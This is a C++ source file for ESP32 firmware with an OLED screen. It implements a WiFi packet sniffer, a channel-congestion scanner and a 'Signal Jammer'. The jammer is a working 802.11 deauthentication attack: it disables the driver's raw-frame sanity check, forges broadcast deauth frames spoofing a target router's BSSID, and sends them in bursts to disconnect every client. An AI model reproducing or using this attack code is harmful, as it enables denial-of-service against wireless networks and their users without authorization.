#include "WifiActions.h"

#include <WiFi.h>
#include "esp_wifi.h"

#include "../core/AppState.h"
#include "../core/Config.h"
#include "../ui/Ui.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { 
    return 0; 
} // Override to allow processing of all WiFi frames without sanity check failures

// TARGET PARAMETERS (Modify to match your target testing environment)
uint8_t target_bssid[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}; // Target Router MAC
uint8_t target_channel = 1;                                     // Target Router Channel

// Base template for an 802.11 Deauthentication Frame
uint8_t deauth_packet[26] = {
    0xC0, 0x00,                         // Type: Management Frame (Deauthentication)
    0x3A, 0x01,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast (Disconnects everyone)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: Will be filled with Target BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Will be filled with Target BSSID
    0x00, 0x00,                         // Fragment / Sequence Number
    0x07, 0x00                          // Reason Code: 7 (Class 3 frame received from nonassociated STA)
};


struct SnifferSnapshot {
  uint32_t packets;
  uint32_t beacons;
  int16_t averageRssi;
  int8_t strongestRssi;
  uint8_t channel;
};

static bool snifferStarted = false;
static volatile uint32_t packetCount = 0;
static volatile uint32_t beaconCount = 0;
static volatile int32_t rssiTotal = 0;
static volatile int8_t strongestRssi = -127;
static volatile uint8_t currentChannel = 1;

static void resetSnifferStats() {
  packetCount = 0;
  beaconCount = 0;
  rssiTotal = 0;
  strongestRssi = -127;
}

static SnifferSnapshot readSnifferStats() {
  SnifferSnapshot stats;
  stats.packets = packetCount;
  stats.beacons = beaconCount;
  stats.averageRssi = packetCount ? (int16_t)(rssiTotal / (int32_t)packetCount) : 0;
  stats.strongestRssi = strongestRssi;
  stats.channel = currentChannel;
  return stats;
}

static void wifiPacketCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (buf == nullptr) {
    return;
  }

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
  const int8_t rssi = packet->rx_ctrl.rssi;

  packetCount++;
  rssiTotal += rssi;
  currentChannel = packet->rx_ctrl.channel;

  if (rssi > strongestRssi) {
    strongestRssi = rssi;
  }

  if (type == WIFI_PKT_MGMT && packet->rx_ctrl.sig_len > 0) {
    const uint8_t frameControl = packet->payload[0];
    const bool isBeaconFrame = (frameControl & 0xFC) == 0x80;

    if (isBeaconFrame) {
      beaconCount++;
    }
  }
}

static bool setSnifferChannel(uint8_t channel) {
  esp_err_t result = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  if (result == ESP_OK) {
    currentChannel = channel;
    return true;
  }

  return false;
}

static bool startWifiSniffer(uint8_t channel) {
  if (snifferStarted) {
    stopWifiSniffer();
  }

  resetSnifferStats();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(100);

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&wifiPacketCallback);

  if (!setSnifferChannel(channel)) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    return false;
  }

  if (esp_wifi_set_promiscuous(true) != ESP_OK) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    return false;
  }

  snifferStarted = true;
  return true;
}

void stopWifiSniffer() {
  if (!snifferStarted) {
    return;
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  snifferStarted = false;
}

static void drawSnifferScreen(const SnifferSnapshot &stats, uint8_t percent) {
  const uint8_t barWidth = map(percent, 0, 100, 0, 116);

  oled.clearDisplay();
  oled.fillRect(0, 0, W, 10, SSD1306_WHITE);
  oled.setTextColor(SSD1306_BLACK);
  oled.setCursor(2, 1);
  oled.print("WIFI SNIFFER");
  oled.setCursor(96, 1);
  oled.print("CH");
  oled.print(stats.channel);
  oled.setTextColor(SSD1306_WHITE);

  if (H <= 32) {
    oled.setCursor(2, 13);
    oled.print("PKT ");
    oled.print((unsigned long)stats.packets);
    oled.setCursor(70, 13);
    oled.print("B ");
    oled.print((unsigned long)stats.beacons);
    oled.setCursor(2, 22);
    oled.print("AVG ");
    oled.print(stats.averageRssi);
    oled.print(" BEST ");
    oled.print(stats.strongestRssi);
  } else {
    oled.drawRoundRect(4, 14, 120, 38, 4, SSD1306_WHITE);
    oled.setCursor(10, 19);
    oled.print("Packets ");
    oled.print((unsigned long)stats.packets);
    oled.setCursor(10, 30);
    oled.print("Beacons ");
    oled.print((unsigned long)stats.beacons);
    oled.setCursor(10, 41);
    oled.print("RSSI ");
    oled.print(stats.averageRssi);
    oled.print("/");
    oled.print(stats.strongestRssi);
    oled.print(" dBm");
  }

  oled.drawRect(5, H - 6, 118, 4, SSD1306_WHITE);
  oled.fillRect(6, H - 5, barWidth, 2, SSD1306_WHITE);
  oled.display();
}

static void showSnifferSummary() {
  const SnifferSnapshot stats = readSnifferStats();
  snprintf(textA, sizeof(textA), "Pkt %lu Bcn %lu", (unsigned long)stats.packets, (unsigned long)stats.beacons);

  if (stats.packets == 0) {
    snprintf(textB, sizeof(textB), "No frames CH %u", stats.channel);
  } else {
    snprintf(textB, sizeof(textB), "RSSI %d/%d CH %u", stats.averageRssi, stats.strongestRssi, stats.channel);
  }

  page("SNIFFER", textA, textB);
}

void wifiSniffing() {
  static const uint8_t channels[] = { 1, 6, 11 };
  constexpr uint16_t runMs = 8000;
  constexpr uint16_t hopMs = 1600;
  constexpr uint16_t refreshMs = 180;

  loading("WIFI", "Sniffer", 500);

  if (!startWifiSniffer(channels[0])) {
    page("SNIFFER", "Start failed", "Check WiFi");
    return;
  }

  const uint32_t startedAt = millis();
  uint32_t lastRefresh = 0;
  uint32_t lastHop = startedAt;
  uint8_t channelIndex = 0;

  while (millis() - startedAt < runMs) {
    const uint32_t now = millis();

    if (now - lastHop >= hopMs) {
      channelIndex = (channelIndex + 1) % COUNT_ITEMS(channels);
      setSnifferChannel(channels[channelIndex]);
      lastHop = now;
    }

    if (now - lastRefresh >= refreshMs) {
      const uint8_t percent = (uint8_t)(((now - startedAt) * 100UL) / runMs);
      drawSnifferScreen(readSnifferStats(), percent);
      lastRefresh = now;
    }

    delay(20);
  }

  stopWifiSniffer();
  showSnifferSummary();
}

void wifiChannels() {
  stopWifiSniffer();
  loading("WIFI", "Channels", 700);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(100);

  const int networkCount = WiFi.scanNetworks(false, true);

  if (networkCount <= 0) {
    WiFi.scanDelete();
    page("CHANNELS", "No networks", "Try again");
    return;
  }

  uint8_t channelLoad[14] = { 0 };

  for (int i = 0; i < networkCount; i++) {
    const int channel = WiFi.channel(i);

    if (channel >= 1 && channel <= 13) {
      channelLoad[channel]++;
    }
  }

  uint8_t busiestChannel = 1;

  for (uint8_t channel = 2; channel <= 13; channel++) {
    if (channelLoad[channel] > channelLoad[busiestChannel]) {
      busiestChannel = channel;
    }
  }

  snprintf(textA, sizeof(textA), "Networks %d", networkCount);
  snprintf(textB, sizeof(textB), "Busy CH %u: %u", busiestChannel, channelLoad[busiestChannel]);
  WiFi.scanDelete();
  page("CHANNELS", textA, textB);
}

void wifiJammer() {
  loading("WIFI", "Signal Jammer", 1000);
    
  stopWifiSniffer();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(100);

  for (int i = 0; i < 6; i++) {
    deauth_packet[10 + i] = target_bssid[i]; // Source MAC
    deauth_packet[16 + i] = target_bssid[i]; // BSSID MAC
  }

  esp_err_t chan_result = esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
  if (chan_result != ESP_OK) {
    page("WIFI JAMMER", "Channel Error", "Failed to lock CH");
    return;
  }

  uint32_t lastRefresh = 0;
  uint16_t burstCount = 200; 

  for (uint16_t i = 0; i < burstCount; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), true);
    
    if (millis() - lastRefresh >= 200) {
      uint8_t percent = (uint8_t)((i * 100UL) / burstCount);
      
      oled.clearDisplay();
      oled.fillRect(0, 0, W, 10, SSD1306_WHITE);
      oled.setTextColor(SSD1306_BLACK);
      oled.setCursor(2, 1);
      oled.print("ATTACKING CH");
      oled.print(target_channel);
      
      oled.setTextColor(SSD1306_WHITE);
      oled.setCursor(4, 18);
      oled.print("Sending Deauth...");
      oled.setCursor(4, 32);
      oled.print("Burst: ");
      oled.print(i);
      
      oled.drawRect(5, H - 6, 118, 4, SSD1306_WHITE);
      oled.fillRect(6, H - 5, map(percent, 0, 100, 0, 116), 2, SSD1306_WHITE);
      oled.display();
      
      lastRefresh = millis();
    }

    delay(20);
  }

  page("WIFI JAMMER", "Deauth Finished", "Check devices");
}
